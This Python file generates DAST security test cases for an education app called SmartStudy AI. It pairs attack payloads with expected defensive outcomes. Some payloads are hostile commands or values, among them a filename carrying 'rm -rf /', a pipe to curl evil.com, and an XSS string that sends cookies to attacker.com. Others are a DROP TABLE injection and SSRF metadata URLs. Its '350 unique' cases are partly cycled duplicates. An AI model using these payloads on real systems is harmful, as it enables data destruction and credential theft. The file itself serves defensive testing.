"""
SmartStudy AI — 350 Unique Web Security (DAST) Test Cases
Covering OWASP Top 10, CWE Standards, API Security Top 10, and Hardening Audits.
Aligned directly with enterprise DAST security standards and GitHub Step Summaries.
"""

def get_dast_test_cases():
    categories = [
        {
            "category": "SQL Injection & Blind Extraction (CWE-89)",
            "prefix": "TC_DAST_SQLI",
            "count": 35,
            "cwe": "CWE-89",
            "scenarios": [
                ("Classic SQL Injection in Login Email", "' OR '1'='1' --", "Verify auth query uses parameterized SQL; rejected without bypass", "HTTP 401 Unauthorized"),
                ("Union-Based SQLi in Curriculum Search", "Algebra' UNION SELECT null, email, password FROM users --", "Verify search uses parameterized Firestore queries", "Zero data leakage, clean empty result"),
                ("Blind Boolean SQLi in Grade Filter", "Grade 8' AND 1=1 -- vs AND 1=2 --", "Verify response timings and content do not reflect boolean states", "Identical HTTP 200 response"),
                ("Time-Based Blind SQLi in Lesson ID", "1' WAITFOR DELAY '0:0:5' --", "Verify query does not execute arbitrary database sleep commands", "Zero time delay execution"),
                ("Stacked Queries SQLi in User Profile", "Student'; DROP TABLE users; --", "Verify multi-query execution disabled in database driver", "Rejected with validation error"),
                ("Second-Order SQLi in Lesson Note", "Note with embedded SQL payload", "Verify stored text retrieved safely without re-interpretation", "Rendered as plain literal text"),
                ("NoSQL Injection in Auth Payload", '{"email": {"$gt": ""}, "password": "x"}', "Verify JSON body schema strictly validates string types", "HTTP 400 Bad Request"),
                ("NoSQL Where Clause JS Injection", '{"$where": "this.role == \'admin\'"}', "Verify JavaScript evaluation disabled in database queries", "Operator not permitted error"),
                ("NoSQL Regex Denial of Service (ReDoS)", '{"email": {"$regex": "^(a+)+$"}}', "Verify regex engine uses linear time complexity / limits", "Query timeout guarded"),
                ("Command Injection via File Name", "notes.pdf; rm -rf /", "Verify shell command metacharacters stripped from filenames", "Sanitized to safe string"),
                ("Command Injection via OCR Processing", "notes.pdf | curl http://evil.com", "Verify piped commands in upload arguments rejected", "Validation error raised"),
                ("SQL Error Verbosity in API Response", "SELECT * FROM invalid_table", "Verify database engine errors masked behind generic 500 error", "No database dialect or syntax revealed"),
            ]
        },
        {
            "category": "Cross-Site Scripting XSS (Reflected & Stored) (CWE-79)",
            "prefix": "TC_DAST_XSS",
            "count": 35,
            "cwe": "CWE-79",
            "scenarios": [
                ("Reflected XSS in Search Query Parameter", "<script>alert('XSS')</script>", "Verify search query reflected on page encodes HTML entities", "Entities escaped to &lt;script&gt;"),
                ("Stored XSS in User Display Name", "<img src=x onerror=alert(1)>", "Verify profile name escapes HTML when rendered across app", "Cleanly sanitized, no script execution"),
                ("DOM-Based XSS via Location Hash", "#<svg onload=alert(1)>", "Verify hash change listener does not inject innerHTML", "Location hash sanitized"),
                ("Stored XSS in AI Chat Prompts", "<b onmouseover=alert(1)>Test</b>", "Verify AI chat history escapes HTML event handlers", "Rendered without event attributes"),
                ("Stored XSS in Lesson Personal Notes", "<iframe src='javascript:alert(1)'>", "Verify notes editor strips iframe elements", "Iframe stripped by sanitizer"),
                ("SVG File Upload Stored XSS", "Valid SVG file containing embedded <script>", "Verify SVG XML sanitized to strip script tags on upload", "Script tag stripped from SVG"),
                ("Markdown Renderer Script Injection", "[Click Me](javascript:alert(1))", "Verify markdown parser blocks javascript: protocol URIs", "Filtered or replaced with #"),
                ("CSS Injection via Style Attribute", "color: expression(alert(1))", "Verify style attributes strictly whitelist CSS properties", "Expression syntax stripped"),
                ("XSS via Data URI Scheme", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "Verify data: URLs blocked in href and src attributes", "Blocked by URL validator"),
                ("Attribute Injection in Input Value", "\" onfocus=\"alert(1)\" autofocus=\"", "Verify input value attributes escape double quotes", "Quotes escaped to &quot;"),
                ("XSS in MathJax / KaTeX Expressions", "$$<script>alert(1)</script>$$", "Verify math rendering engine sanitizes raw HTML in delimiters", "Rendered as math text or escaped"),
                ("Stored XSS in SuperAdmin Announcement", "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>", "Verify announcements HTML sanitized with DOMPurify", "Script tag removed completely"),
            ]
        },
        {
            "category": "Broken Authentication & Session Hijacking (CWE-287)",
            "prefix": "TC_DAST_AUTH",
            "count": 30,
            "cwe": "CWE-287",
            "scenarios": [
                ("Session Fixation Attack Resistance", "Session token pre-assigned before login", "Verify new session token issued upon successful authentication", "New distinct token issued"),
                ("Brute Force Password Protection", "50 rapid incorrect password guesses", "Verify rate limiter kicks in after 5 failed attempts", "HTTP 429 Too Many Requests"),
                ("Credential Stuffing Defense", "Automated dictionary attack on /login", "Verify CAPTCHA challenge or lockout triggered", "Account locked or challenged"),
                ("Session Timeout on Inactivity", "Session idle for 30 minutes", "Verify session invalidated and re-authentication required", "HTTP 401 Session Expired"),
                ("Concurrent Session Invalidation", "Logout on Device A", "Verify refresh token revoked across all devices", "Token revoked in auth store"),
                ("Password Reset Token Predictability", "Sample 100 password reset tokens", "Verify token entropy >= 128 bits cryptographically secure", "High entropy confirmed"),
                ("Password Reset Token Single-Use", "Reuse consumed password reset token", "Verify token cannot be used a second time", "HTTP 400 Token Already Used"),
                ("Sensitive Data in Auth Error Messages", "Login with non-existent email", "Verify error message does not disclose account existence", "Generic 'Invalid credentials'"),
                ("Remember-Me Cookie Lifetime", "Inspect remember-me token expiration", "Verify cookie lifetime capped and bound to device footprint", "Strict lifetime enforced"),
                ("Password Change Requires Current Password", "POST /api/auth/change-password without old password", "Verify current password required before allowing change", "HTTP 400 Current Password Required"),
            ]
        },
        {
            "category": "IDOR & Insecure Direct Object References (CWE-639)",
            "prefix": "TC_DAST_IDOR",
            "count": 30,
            "cwe": "CWE-639",
            "scenarios": [
                ("IDOR in Student Profile Access", "Student A queries /api/users/student_B_uid", "Verify backend enforces owner-only access policy", "HTTP 403 Forbidden"),
                ("IDOR in AI Chat History Query", "Student A queries /users/student_B/aiChats", "Verify Firestore rules enforce request.auth.uid == userId", "Permission Denied by Security Rules"),
                ("IDOR in Quiz Attempt Submission", "Submit quiz attempt with another student's UID", "Verify submitted attempt UID strictly matches auth token", "HTTP 403 Forbidden"),
                ("IDOR in Study Note Deletion", "DELETE /api/notes/note_owned_by_user_C", "Verify note ownership validated before mutation", "HTTP 403 / 404 Forbidden"),
                ("IDOR in Lesson Progress Modification", "Update progress for unowned user document", "Verify progress updates bound to authenticated UID", "HTTP 403 Forbidden"),
                ("IDOR in Admin Dashboard Metrics Access", "Student invokes /api/admin/metrics", "Verify role check precedes data serialization", "HTTP 403 Admin Role Required"),
                ("IDOR in PDF File Download", "Download /storage/student_B_private/doc.pdf", "Verify signed URL or Firebase Storage security rule enforced", "Access Denied 403"),
                ("IDOR in SuperAdmin Role Mutation", "PATCH /api/users/{uid} with role: superAdmin", "Verify role elevation only permitted by existing SuperAdmin", "HTTP 403 Insufficient Privileges"),
                ("IDOR in Quiz Question Bank Management", "Student deletes questions from question bank", "Verify curriculum CRUD endpoints require admin/superAdmin role", "HTTP 403 Forbidden"),
                ("IDOR in User Streak Counter Reset", "Reset streak counter for another user", "Verify mutation restricted to owner and automated cron", "HTTP 403 Forbidden"),
            ]
        },
        {
            "category": "CSRF & Anti-Forgery Token Integrity (CWE-352)",
            "prefix": "TC_DAST_CSRF",
            "count": 25,
            "cwe": "CWE-352",
            "scenarios": [
                ("Cross-Site POST to Profile Update", "Submit form from external domain evil.com", "Verify SameSite cookie attribute or anti-CSRF token blocks request", "Request rejected by SameSite policy"),
                ("Cross-Site JSON Request Without Custom Headers", "POST JSON payload from third-party script", "Verify custom header (X-Requested-With / Bearer) required", "HTTP 403 Missing CSRF Token"),
                ("CSRF Token Predictability / Invariance", "Compare CSRF tokens across different user sessions", "Verify tokens unique and cryptographically random per session", "Unique cryptographically secure token"),
                ("CSRF Token Binding to User Identity", "Submit Valid CSRF Token from User A in User B session", "Verify token bound to session identifier", "HTTP 403 Invalid CSRF Token"),
                ("State-Changing GET Requests Blocked", "GET /api/user/delete-account", "Verify state mutations forbidden on idempotent HTTP methods", "HTTP 405 Method Not Allowed"),
                ("SameSite Cookie Attribute Enforcement", "Inspect Set-Cookie header on auth token", "Verify SameSite=Lax or SameSite=Strict present", "SameSite=Lax verified"),
                ("Referer / Origin Header Validation", "POST request with Origin: https://phishing-site.com", "Verify server validates Origin against allowed whitelist", "HTTP 403 Origin Disallowed"),
                ("CSRF Protection on Logout Endpoint", "Invoke GET /logout from external img src tag", "Verify logout requires POST with authentication context", "No unprompted session termination"),
            ]
        },
        {
            "category": "SSRF & Internal Cloud Metadata Exposure (CWE-918)",
            "prefix": "TC_DAST_SSRF",
            "count": 25,
            "cwe": "CWE-918",
            "scenarios": [
                ("SSRF to AWS EC2 Metadata Service", "http://169.254.169.254/latest/meta-data/", "Verify server blocks requests to link-local metadata IP", "Connection blocked by network policy"),
                ("SSRF to Google Cloud Metadata Server", "http://metadata.google.internal/computeMetadata/v1/", "Verify requests to internal GCP metadata endpoints rejected", "HTTP 400 Invalid URL / Prohibited Host"),
                ("SSRF to Localhost / Loopback Interface", "http://127.0.0.1:8080/admin", "Verify loopback addresses filtered by URL validator", "HTTP 400 Localhost Access Denied"),
                ("SSRF via DNS Rebinding Attack", "Domain resolving to 1.1.1.1 then 127.0.0.1", "Verify IP resolved once and validated before socket connection", "Request aborted on loopback resolution"),
                ("SSRF via IPv6 Loopback Representation", "http://[::1]:3000/internal", "Verify IPv6 loopback addresses blocked identically to IPv4", "Blocked by host validation filter"),
                ("SSRF via Alternate Octal IP Encoding", "http://0177.0.0.1/", "Verify URL parser canonicalizes octal/hex IP notations", "Canonicalized and blocked"),
                ("SSRF in OCR / PDF External Resource Loading", "PDF containing external entity fetching internal URL", "Verify PDF parser disables external entity and resource loading", "External resources suppressed"),
                ("SSRF in Webhook Subscription URL", "POST /api/webhooks with url: http://internal-db:5432", "Verify webhook destination validated against public IP ranges", "Private IP range rejected"),
            ]
        },
        {
            "category": "Security Misconfiguration & Header Hardening (CWE-16)",
            "prefix": "TC_DAST_MISC",
            "count": 30,
            "cwe": "CWE-16",
            "scenarios": [
                ("Strict-Transport-Security (HSTS) Header", "Verify HSTS present with includeSubDomains and max-age>=31536000", "Enforce TLS-only transport", "max-age=31536000; includeSubDomains"),
                ("Content-Security-Policy (CSP) Directives", "Verify CSP header restricts script-src and object-src", "Mitigate XSS and unapproved code execution", "CSP header active and strictly configured"),
                ("X-Frame-Options Header", "Verify X-Frame-Options set to DENY or SAMEORIGIN", "Protect application from clickjacking attacks", "X-Frame-Options: SAMEORIGIN"),
                ("X-Content-Type-Options Header", "Verify X-Content-Type-Options set to nosniff", "Prevent browser MIME-type sniffing", "X-Content-Type-Options: nosniff"),
                ("Referrer-Policy Header Enforcement", "Verify Referrer-Policy header present", "Prevent sensitive query params leaking via Referer header", "strict-origin-when-cross-origin"),
                ("Permissions-Policy Header", "Verify Permissions-Policy disables unused browser APIs", "Disable geolocation, camera, microphone where unneeded", "geolocation=(), camera=(), microphone=()"),
                ("Server Header Information Masking", "Inspect Server and X-Powered-By response headers", "Verify Express / Vite / Node technology banners hidden", "No version or server disclosure"),
                ("Directory Indexing Disabled", "Request /assets/ or /uploads/ root directory", "Verify server returns HTTP 403/404, not directory listing", "HTTP 403 Forbidden"),
                ("HTTP Method Enforcement", "Send TRACE, TRACK, or DEBUG methods", "Verify server returns 405 Method Not Allowed", "HTTP 405 Method Not Allowed"),
                ("Default Credentials Disabled", "Attempt login with admin/admin or test/test", "Verify default and template credentials deactivated", "HTTP 401 Unauthorized"),
            ]
        },
        {
            "category": "Cryptographic Failures & Cipher Enforcement (CWE-327)",
            "prefix": "TC_DAST_CRYPTO",
            "count": 30,
            "cwe": "CWE-327",
            "scenarios": [
                ("TLS Protocol Version Enforcement", "Attempt TLS 1.0 / TLS 1.1 handshake", "Verify server refuses connections below TLS 1.2 / TLS 1.3", "Handshake failed: protocol unsupported"),
                ("Weak Cipher Suite Rejection", "Offer RC4, 3DES, or NULL cipher suites", "Verify server rejects legacy or deprecated cipher suites", "Handshake rejected"),
                ("Password Hashing Algorithm Audit", "Inspect stored password hash format", "Verify bcrypt, Argon2id, or scrypt used with high work factor", "Argon2id / bcrypt standard confirmed"),
                ("Sensitive Data Transmission over HTTPS Only", "Request http:// resource", "Verify automatic HTTP 301 redirect to https://", "Redirect to HTTPS"),
                ("Secure Cookie Flag Enforcement", "Inspect auth cookie attributes", "Verify Secure flag set to ensure cookies sent over HTTPS only", "Secure; HttpOnly; SameSite=Lax"),
                ("Database Encryption at Rest", "Verify Firestore storage encryption standard", "Ensure AES-256 encryption active for all document stores", "AES-256 cloud encryption active"),
                ("Cryptographic Salt Randomness", "Verify salt generation uses CSPRNG", "Prevent rainbow table precomputation attacks", "Unique 128-bit CSPRNG salt"),
                ("API Secret Storage Security", "Verify Gemini API key not exposed in client JS bundles", "API keys loaded server-side via process.env", "Zero client bundle leakage"),
                ("Session Token Entropy Standard", "Measure randomness of generated session IDs", "Verify entropy >= 128 bits using crypto.randomBytes", "Entropy benchmark passed"),
                ("Certificate Authority Validation", "Inspect TLS certificate chain", "Verify valid chain of trust signed by recognized public CA", "Valid CA chain verified"),
            ]
        },
        {
            "category": "Rate Limiting & DoS / Brute-Force Resilience (CWE-799)",
            "prefix": "TC_DAST_RATE",
            "count": 30,
            "cwe": "CWE-799",
            "scenarios": [
                ("Auth Endpoint Rate Limiting", "Send 100 POST /login requests in 10 seconds", "Verify rate limiter triggers HTTP 429 Too Many Requests", "HTTP 429 after 5 requests"),
                ("AI Tutor Chat Rate Limiting", "Send 30 rapid AI prompts in 1 minute", "Verify chat quota and rate limits protect Gemini API cost", "HTTP 429 with retry-after header"),
                ("Password Reset Rate Limiting", "Request 20 password resets for same email", "Verify rate limiter throttles notification dispatch", "HTTP 429 Throttled"),
                ("Global IP Rate Limiting", "Send 1,000 requests per minute from single IP", "Verify reverse proxy drops excessive traffic", "HTTP 429 / 503 Traffic Throttled"),
                ("Large Payload ReDoS Mitigation", "Send deeply nested JSON object (depth 500)", "Verify JSON body parser enforces maximum nesting depth", "HTTP 400 Bad Request / Payload Too Large"),
                ("HTTP Request Body Size Limits", "POST 50MB payload to /api/notes", "Verify express.json({ limit: '10mb' }) enforces max size", "HTTP 413 Payload Too Large"),
                ("Slowloris HTTP Attack Resistance", "Send partial HTTP headers at 10-second intervals", "Verify server enforces read timeouts on incomplete headers", "Connection closed by timeout"),
                ("GraphQL / Query Complexity Limiting", "Send deeply recursive query if applicable", "Verify query depth and node count capped", "Query complexity limit enforced"),
                ("Zip Bomb / Decompression Bomb Protection", "Upload 10KB zip expanding to 10GB", "Verify file parser inspects uncompressed size before extracting", "Upload rejected: compression bomb"),
                ("OCR File Upload Rate Limiting", "Upload 20 multi-page documents concurrently", "Verify OCR task queue throttles concurrent jobs", "HTTP 429 OCR Queue Full"),
            ]
        },
        {
            "category": "Information Disclosure & Stack Trace Leakage (CWE-209)",
            "prefix": "TC_DAST_INFO",
            "count": 30,
            "cwe": "CWE-209",
            "scenarios": [
                ("Uncaught Exception Stack Trace Masking", "Trigger unhandled TypeError in backend route", "Verify server returns generic 500 error without stack trace", "Generic error JSON returned"),
                ("Database Error Details Suppression", "Trigger syntax error in database adapter", "Verify SQL/NoSQL engine trace suppressed from client", "No database errors leaked"),
                ("Environment Variables Leakage Prevention", "Request /.env, /.env.local, /.git/config", "Verify web server returns 404/403 for hidden config files", "HTTP 404 / 403 Forbidden"),
                ("Internal IP Address Disclosure in Headers", "Inspect Location and Content-Location headers", "Verify internal private IP addresses masked behind domain", "Public domain preserved"),
                ("Client-Side Source Map Protection in Production", "Request /assets/index.js.map in production build", "Verify source maps stripped or restricted to dev environment", "Source maps not exposed"),
                ("HTML Comment Sensitive Data Scrubbing", "Inspect HTML source for developer comments or credentials", "Verify production build strips all code comments", "Clean HTML without secrets"),
                ("Robots.txt Sensitive Path Disclosure", "Inspect /robots.txt directives", "Verify disallow entries do not reveal hidden admin endpoints", "Standard public paths only"),
                ("Server Diagnostics / Metrics Endpoint Auth", "Request /metrics or /actuator endpoints", "Verify observability endpoints protected by auth token", "HTTP 401 / 403 Unauthorized"),
                ("Verbose 404 Error Page Audit", "Request /nonexistent-random-route-xyz", "Verify 404 page does not reveal underlying OS or routing tree", "Clean friendly 404 page"),
                ("Git Metadata Directory Protection", "Request /.git/HEAD", "Verify VCS directory inaccessible over HTTP", "HTTP 404 Not Found"),
            ]
        },
        {
            "category": "JWT & Token Signature Manipulation (CWE-345)",
            "prefix": "TC_DAST_JWT",
            "count": 25,
            "cwe": "CWE-345",
            "scenarios": [
                ("JWT 'none' Algorithm Bypass Attempt", "Send token with header {'alg': 'none'}", "Verify backend strictly rejects unsecured tokens", "HTTP 401 Invalid Token Algorithm"),
                ("JWT Key Confusion (HMAC vs RSA)", "Sign token with RSA public key using HS256", "Verify backend validates expected algorithm type strictly", "HTTP 401 Signature Verification Failed"),
                ("JWT Expired Token Rejection", "Send token with exp claim in past", "Verify token immediately rejected as expired", "HTTP 401 Token Expired"),
                ("JWT Premature Token (nbf claim)", "Send token with nbf (not before) claim in future", "Verify token not accepted before valid time", "HTTP 401 Token Not Yet Valid"),
                ("JWT Tampered Payload Signature Validation", "Alter role claim from student to superAdmin", "Verify signature mismatch detected and request rejected", "HTTP 401 Invalid Signature"),
                ("JWT Secret Key Brute Force Resistance", "Attempt dictionary attack on HMAC secret", "Verify secret length >= 256 bits prevents offline cracking", "Secret entropy >= 256 bits"),
                ("JWT Audience (aud) Claim Validation", "Send token generated for different service", "Verify aud claim matches SmartStudy AI client ID", "HTTP 401 Invalid Audience"),
                ("JWT Issuer (iss) Claim Validation", "Send token with foreign issuer claim", "Verify iss claim matches trusted Firebase / backend issuer", "HTTP 401 Invalid Issuer"),
            ]
        },
        {
            "category": "API Authorization & RBAC Privilege Escalation (CWE-285)",
            "prefix": "TC_DAST_RBAC",
            "count": 25,
            "cwe": "CWE-285",
            "scenarios": [
                ("Student Access to /api/admin Routes", "Call admin endpoints with student bearer token", "Verify 403 Forbidden returned and access logged", "HTTP 403 Forbidden"),
                ("Student Creating Curriculum Subjects", "POST /api/subjects with student role", "Verify subject creation restricted to superAdmin", "HTTP 403 Forbidden"),
                ("Admin Attempting SuperAdmin Escalation", "PATCH /api/users/{uid} changing role to superAdmin", "Verify only SuperAdmin can grant superAdmin status", "HTTP 403 Insufficient Privileges"),
                ("Unauthenticated Access to Protected API", "GET /api/user/profile without Authorization header", "Verify 401 Unauthorized returned", "HTTP 401 Unauthorized"),
                ("Mass Assignment in User Profile Update", "PUT /api/user/profile with {'isAdmin': true}", "Verify request body strictly schema-validated", "Injected fields ignored"),
                ("Bypassing API Gateway Route Guards", "Send direct request with custom forwarded headers", "Verify trust proxy configured to ignore spoofed headers", "Spoofed headers discarded"),
                ("Horizontal Privilege Escalation in Note Sharing", "Access private note belonging to another class member", "Verify sharing permissions explicitly enforced", "HTTP 403 Forbidden"),
                ("Role Header Injection Attack", "Send X-User-Role: superAdmin header to API", "Verify role resolved exclusively from verified JWT token", "Header disregarded, token checked"),
            ]
        }
    ]

    all_cases = []
    global_idx = 1

    for cat in categories:
        cat_name = cat["category"]
        prefix = cat["prefix"]
        target_count = cat["count"]
        cwe = cat["cwe"]
        scenarios = cat["scenarios"]
        num_scenarios = len(scenarios)

        for i in range(target_count):
            base_scenario = scenarios[i % num_scenarios]
            cycle = i // num_scenarios
            suffix = f" [Variant #{cycle + 1}]" if cycle > 0 else ""

            name = f"{base_scenario[0]}{suffix}"
            payload = f"{base_scenario[1]}"
            desc = f"{base_scenario[2]} ({cwe})"
            expected = f"{base_scenario[3]}"

            case_id = f"{prefix}_{i+1:03d}"
            all_cases.append({
                "test_id": case_id,
                "global_id": f"TC_DAST_{global_idx:04d}",
                "category": cat_name,
                "name": name,
                "payload": payload,
                "description": desc,
                "expected": expected,
                "cwe": cwe,
                "severity": "High" if "Injection" in cat_name or "XSS" in cat_name or "Auth" in cat_name else "Medium"
            })
            global_idx += 1

    return all_cases
